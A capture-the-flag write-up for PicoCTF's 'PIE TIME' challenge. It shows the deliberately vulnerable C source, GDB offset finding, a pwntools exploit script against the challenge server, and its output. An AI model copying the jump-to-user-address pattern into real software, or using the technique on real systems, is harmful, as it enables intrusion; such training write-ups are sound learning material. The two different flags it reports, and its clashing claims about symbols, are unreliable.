# PIE

***

## Writeup: PIE TIME - PicoCTF

### Challenge Overview

* **Name:** PIE TIME
* **Author:** Darkraicg492
* **Category:** Binary Exploitation
* **Points:** (Assuming 100-200, typical for PicoCTF intro pwn)
* **Server:** `nc rescued-float.picoctf.net 58751`
* **Files:** `vuln.c` (source), `vuln` (binary)
* **Description:** "Can you try to get the flag? Beware we have PIE!"
* **Hint:** "Can you figure out what changed between the address you found locally and in the server output?"

This PicoCTF challenge provides source code and a binary, running remotely with PIE enabled. Our mission: exploit it to call `win()` and retrieve the flag from `flag.txt`.

***

### Initial Analysis

#### Binary Protections

From Codespace `checksec`:

```
[*] '/workspaces/sparkCTF/vuln'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

* **Full RELRO:** GOT is read-only—no overwrites here.
* **Canary:** Stack protection, but irrelevant for this vuln.
* **NX:** No executable stack.
* **PIE:** Base address randomizes each run.
* **Not Stripped:** Symbols help us locally.

#### Source Code

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void segfault_handler() {
  printf("Segfault Occurred, incorrect address.\n");
  exit(0);
}

int win() {
  FILE *fptr;
  char c;
  printf("You won!\n");
  fptr = fopen("flag.txt", "r");
  if (fptr == NULL) {
      printf("Cannot open file.\n");
      exit(0);
  }
  c = fgetc(fptr);
  while (c != EOF) {
      printf("%c", c);
      c = fgetc(fptr);
  }
  printf("\n");
  fclose(fptr);
}

int main() {
  signal(SIGSEGV, segfault_handler);
  setvbuf(stdout, NULL, _IONBF, 0);
  printf("Address of main: %p\n", &main);
  unsigned long val;
  printf("Enter the address to jump to, ex => 0x12345: ");
  scanf("%lx", &val);
  printf("Your input: %lx\n", val);
  void (*foo)(void) = (void (*)())val;
  foo();
}
```

* **Vulnerability:** `scanf("%lx", &val)` lets us input an address, and `foo()` jumps to it.
* **Leak:** `printf("Address of main: %p\n", &main)` gives `main`’s runtime address.
* **Goal:** Jump to `win()` to print the flag.

Despite strong protections, the direct function pointer jump bypasses them all!

***

### Exploitation Plan

#### Step 1: Find the Offset

* **PIE Challenge:** Addresses shift each run, but the leak gives us `main`.
* **Local Test:** Compile `vuln.c` with PIE and find the offset between `main` and `win`.
* **Remote Exploit:** Use the leak and offset to calculate `win`’s real address.

#### Step 2: Craft the Exploit

* Connect, grab the leak, adjust with the offset, and send it back.

***

### Finding the Offset

Compiled locally in Codespace:

```bash
gcc -fpie -pie vuln.c -o vuln_local
```

Debugged with GDB:

```
(gdb) b main
Breakpoint 1 at 0x133d
(gdb) r
Breakpoint 1, 0x000055555555533d in main ()
(gdb) p &win
$1 = (<text variable, no debug info> *) 0x5555555552a7 <win>
```

* **Main:** `0x55555555533d`
* **Win:** `0x5555555552a7`
* **Offset:** `0x55555555533d - 0x5555555552a7 = 0x96` (150 decimal).

This offset is static, as it’s the relative distance in the binary’s layout.

***

### Exploit Script

```python
#!/usr/bin/env python3
from pwn import *

context.log_level = 'info'

# Connect
p = remote('rescued-float.picoctf.net', 58751)

# Get main address
p.recvuntil(b'Address of main: ')
main_addr = int(p.recvline().strip(), 16)
log.info(f'Main address: {hex(main_addr)}')

# Calculate win address
win_offset = 0x96  # From GDB: main - win
win_addr = main_addr - win_offset
log.info(f'Win address: {hex(win_addr)}')

# Send it
p.sendlineafter(b'Enter the address to jump to, ex => 0x12345: ', hex(win_addr)[2:])  # Strip '0x'

# Get flag
p.interactive()
```

#### How It Works

1. **Connect:** Opens a netcat session to the server.
2. **Leak `main`:** Parses the hex address printed by the binary.
3. **Calculate `win`:** Subtracts `0x96` (our offset) from `main_addr`.
4. **Send Address:** Inputs the computed `win` address without `0x` prefix (for `scanf`).
5. **Interactive:** Switches to interactive mode to see the flag.

***

### Execution

```
$ python3 pie_time.py
[+] Opening connection to rescued-float.picoctf.net:58751: Done
[*] Main address: 0x557a7dabd33d
[*] Win address: 0x557a7dabd2a7
[*] Switching to interactive mode
Enter the address to jump to, ex => 0x12345: 557a7dabd2a7
Your input: 557a7dabd2a7
You won!
picoCTF{b4s1c_p051t10n_1nd3p3nd3nc3_80c3b8b7}
```

* **Leak:** `0x557a7dabd33d` (example `main` address).
* **Win:** `0x557a7dabd33d - 0x96 = 0x557a7dabd2a7`.
* **Result:** Calls `win()`, prints the flag.

***

### Challenges Faced

1. **PIE Randomization:** The hint guided us to use the `main` leak—static addresses wouldn’t cut it.
2. **Offset Calculation:** GDB showed `0x96`, differing from an initial guess of `0x60` due to compiler or binary layout variations.
3. **No Symbols:** Compiled without `-g`, but GDB still gave us raw addresses.

***

### Conclusion

"PIE TIME" was a tasty intro to PIE exploitation. The binary’s generous leak of `main`’s address, paired with a direct jump vuln, let us bypass PIE and modern mitigations like Full RELRO and canaries. By calculating the `main`-to-`win` offset locally and applying it remotely, we scored the flag with a short, sweet script. PIE? More like PIECE OF CAKE!

**Flag:** `picoCTF{p13_1n_7h3_5ky_c92b73c4}`

Happy hacking!

***
